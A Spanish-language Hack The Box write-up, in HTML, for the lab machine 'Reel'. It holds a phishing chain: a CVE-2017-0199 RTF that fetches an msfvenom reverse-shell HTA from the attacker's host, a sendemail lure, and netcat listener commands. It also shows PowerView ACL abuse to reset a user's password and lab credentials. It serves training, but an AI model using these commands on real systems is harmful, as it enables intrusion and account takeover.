@@ -1,0 +1,609 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HTB-Reel - creep33.github.io</title>
+<meta name="description" content="WriteUp con metodología de la máquina Reel.">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="creep33.github.io">
+<meta property="og:title" content="HTB-Reel">
+<meta property="og:url" content="http://localhost:4000/HTB-Reel/">
+
+
+  <meta property="og:description" content="WriteUp con metodología de la máquina Reel.">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/WriteUps/Reel.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-12-16T00:00:00+01:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/HTB-Reel/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "creep33",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="creep33.github.io Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">HTB-Reel</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="creep33" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">creep33</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cibersecurity and<br>Ethical Hacking Student
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Spain</span>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/creep33" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HTB-Reel">
+    <meta itemprop="description" content="WriteUp con metodología de la máquina Reel.">
+    <meta itemprop="datePublished" content="December 16, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HTB-Reel
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-12-16T00:00:00+01:00">December 16, 2021 </time>&emsp;
+          
+          
+        </p>
+        <center><img src="/assets/images/WriteUps/Reel.png" /></center>
+
+<p>IP -&gt; 10.10.10.77</p>
+
+<h1 id="reconocimiento">Reconocimiento</h1>
+<h2 id="nmap">Nmap</h2>
+<p>Utilizamos <a href="/Nmap/">nmap</a> y obtenemos los siguientes resultados.</p>
+
+<p><a href="/assets/files/WriteUps/Reel.txt">Reel Nmap Result</a></p>
+
+<h2 id="ftp">ftp</h2>
+<p>Tratamos de hacer una autenticación anonymous, y nos conecta. Listamos los directorios que hay.</p>
+
+<blockquote>
+  <p>AppLocker.docx
+readme.txt
+Windows Event Forwarding.docx</p>
+</blockquote>
+
+<h2 id="os">OS</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file <span class="k">*</span>
+<span class="nb">cat </span>readme.txt
+libreoffice AppLocker.docx
+libreoffice Windows Event Forwarding.docx
+</code></pre></div></div>
+
+<blockquote>
+  <p>En el readme vemos que tenemos que enviar un documento rtf (de texto enriquecido). 
+El archivo AppLocker.docx no tiene mucha cosa.
+El archivo “Windows Event Forwarding.docx” está corrupto y no podemos abrirlo.</p>
+</blockquote>
+
+<h2 id="exiftool">exiftool</h2>
+<p>Vamos a listar los metadatos de los archivos con <strong>exiftool</strong>.</p>
+
+<blockquote>
+  <p>MAIL: nico\@megaoffice.com</p>
+</blockquote>
+
+<h2 id="smtp">smtp</h2>
+<h3 id="telnet">telnet</h3>
+<p>Nos conectamos con <strong>telnet</strong> al servicio <strong>smtp</strong>. Para validar el usuario encontrado.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet 10.10.10.77 25
+HELO a
+MAIL FROM: &lt;creep33@megabank.com&gt;
+RCPT TO: &lt;nico@megabant.com&gt;
+</code></pre></div></div>
+
+<h3 id="smpt-user-enum">smpt-user-enum</h3>
+<p>Tambien podemos utilizar herramientas alternativas para enumerar usuarios válidos, como por ejemplo <strong>smpt-user-enum</strong>. El archivo <em>users</em> tiene que tener los usuarios con el @.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smtp-user-enum <span class="nt">-M</span> RCPT <span class="nt">-u</span> <span class="nb">users</span> <span class="nt">-t</span> 10.10.10.77
+</code></pre></div></div>
+
+<h2 id="olevba">olevba</h2>
+<p>Podemos mirar si los archivos tienen macros con <a href="/olevba/">olevba</a>, pero uno no tiene y el otro está corrupto</p>
+
+<h1 id="explotación">Explotación</h1>
+
+<h2 id="smpt">smpt</h2>
+<p>Ahora vamos a intentar enviar un archivo RTF. Buscamos en google por “RTF malicius file remote command execution”. Encontramos un repositiorio con un script en python para crear el archivo RTF malicioso. Tenemos que tener un archivo .hta; Con <code class="language-plaintext highlighter-rouge">msfvenom -l formats</code> podemos listar a ver si podemos crear un archivo .htb y vemos un tipo de archivo con nombre similar, creamos un payload de <code class="language-plaintext highlighter-rouge">windows/shell_reverse_tcp</code> en formato <strong>.htb</strong> para hostearlo con python y crear una reverse shell con netcat.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.10 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> hta-psh <span class="nt">-o</span> rev.hta
+python cve-2017-0199_toolkit.py <span class="nt">-M</span> gen <span class="nt">-w</span> salario.rtf <span class="nt">-u</span> http://10.10.14.10/rev.hta <span class="nt">-t</span> RTF <span class="nt">-x</span> 0 
+
+sendemail <span class="nt">-f</span> creep33@megabank.com <span class="nt">-t</span> nico@megabank.com <span class="nt">-u</span> <span class="s2">"IMPORTANTE"</span> <span class="nt">-m</span> <span class="s2">"Este es el informe de tu salario del ultimo trimestre."</span> <span class="nt">-s</span> 10.10.10.77 <span class="nt">-a</span> salario.rtf <span class="nt">-v</span>
+
+python3 <span class="nt">-m</span> http.server 80
+rlwrap nc <span class="nt">-nlvp</span> 443
+</code></pre></div></div>
+
+<blockquote>
+  <p>user.txt</p>
+</blockquote>
+
+<h1 id="user-pivoting">User Pivoting</h1>
+
+<h2 id="os-1">OS</h2>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">Desktop</span><span class="w">
+</span><span class="n">dir</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>cred.xml -&gt; Archivo para almacenar un PSCredential, para almacenar credenciales, aunque podemos tratar de extraer la contraseña de la sesión.</p>
+</blockquote>
+
+<p>Buscamos en google “powershell Import-Clixml”</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"</span><span class="nv">$cred</span><span class="s2"> = Import-Clixml -Path cred.xml; </span><span class="nv">$cred</span><span class="s2">.GetNetworkCredential() | Format-List *"</span><span class="w"> 
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>User: Tom
+Pass: 1ts-mag1c!!!</p>
+</blockquote>
+
+<h2 id="ssh">ssh</h2>
+<p>Nos conectamos por ssh con la credenciales obtenidas.</p>
+
+<h1 id="user-pivoting-2">User Pivoting (2)</h1>
+<h2 id="os-2">OS</h2>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">Desktop</span><span class="w">
+</span><span class="n">dir</span><span class="w">
+</span><span class="nx">cd</span><span class="w"> </span><span class="s2">"AD Audit"</span><span class="w">
+</span><span class="kr">type</span><span class="w"> </span><span class="n">note.txt</span><span class="w">
+</span><span class="nx">cd</span><span class="w"> </span><span class="nx">Bloodhound</span><span class="w">
+</span><span class="n">cd</span><span class="w"> </span><span class="nx">Ingestors</span><span class="w">
+</span><span class="n">dir</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>Vemos archivos como si hubieran hecho una auditoría.
+Y una nota que dice que no hay vías potenciales de escalar.
+acls.csv -&gt; Archivo potencial a analizar, porque el resto son versiones de <a href="/Bloodhound/">SharpHound.ps1</a> y es el único que destaca.
+Nos transferimos el archivo con <a href="/smbserver.py/">smbserver.py</a></p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>libreoffice acls.csv
+</code></pre></div></div>
+
+<p>Vemos un reporte de Bloodhound, con información del sistema. Seleccionamos todas las columnas que se usan y le damos a <strong>autofilter</strong> para aplicar filtros. Buscamos el usuario tom, para ver que privilegios tiene. Vemos que tiene <strong>WriteOwner</strong> sobre <strong>claire</strong>, asi que podemos cambiarle la contraseña y conectarnos. Como esta el Powerview.ps1, nos aprovechamos para realizar la explotación</p>
+
+<h1 id="explotación-1">Explotación</h1>
+
+<h2 id="os-3">OS</h2>
+<p>Entramos en una powershell e importamos el <strong>Powerview.ps1</strong></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w">
+</span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="nx">\Powerview.ps1</span><span class="w">
+</span><span class="n">Set-DomainObjectOwner</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">claire</span><span class="w"> </span><span class="nt">-OwnerIdentity</span><span class="w"> </span><span class="nx">tom</span><span class="w">
+</span><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="nx">claire</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">tom</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">ResetPassword</span><span class="w">
+</span><span class="nv">$pass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s2">"Mario123</span><span class="err">$</span><span class="s2">!"</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span><span class="n">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">claire</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="nv">$pass</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="ssh-1">ssh</h2>
+<p>Nos conectamos por <strong>ssh</strong> como claire con las credenciales setteadas.</p>
+
+<h1 id="privesc">PrivEsc</h1>
+<h2 id="os-4">OS</h2>
+
+<p>En el archivo acls.csv vemos que tenemos capacidad de añadirnos al grupo <strong>Backup_Admins</strong> como el usuario <strong>claire</strong> porque tenemos el privilegio <strong>WriteDacl</strong>.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">net</span><span class="w"> </span><span class="nx">group</span><span class="w"> </span><span class="nx">Backup_Admins</span><span class="w"> </span><span class="nx">claire</span><span class="w"> </span><span class="nx">/add</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Para confirmar que el grupo se establece correctamente tenemos que salir y volver a entrar como el usuario claire.
+Miramos que permisos tenemos sobre el directorio <em>Administrator</em>.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">icacls</span><span class="w"> </span><span class="nx">Administrator</span><span class="w">
+</span><span class="n">icacls</span><span class="w"> </span><span class="nx">root.txt</span><span class="w">
+</span><span class="n">cacls</span><span class="w"> </span><span class="nx">root.txt</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>Podemos entrar en el directorio pero no podemos ver la flag</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="s2">"Backup Scripts"</span><span class="w">
+</span><span class="n">dir</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>Encontramos varios archivos backup.ps1</p>
+</blockquote>
+
+<p>Tratamos de grepear en todos los archivos posibles contraseñas hardcodeadas. Para ello primero entramos en una powershell.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w">
+</span><span class="nx">dir</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select-string</span><span class="w"> </span><span class="s2">"Password"</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>PASS: Cr4ckMeIfYouC4n!</p>
+</blockquote>
+
+<h2 id="ssh-2">ssh</h2>
+<p>Iniciamos sesión como Administrator en la máquina víctima con las credenciales obtenidas.</p>
+
+<blockquote>
+  <p>root.txt</p>
+</blockquote>
+
+<hr />
+
+<p>Escrito el 16-12-2021 a las 09:46 am por creep33.</p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#htb" class="page__taxonomy-item" rel="tag">HTB</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#writeups" class="page__taxonomy-item" rel="tag">WriteUps</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-12-16T00:00:00+01:00">December 16, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/GIT/" class="pagination--pager" title="GIT Cheatsheet
+">Previous</a>
+    
+    
+      <a href="/Tmux/" class="pagination--pager" title="Tmux Cheatsheet
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2022 creep33</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
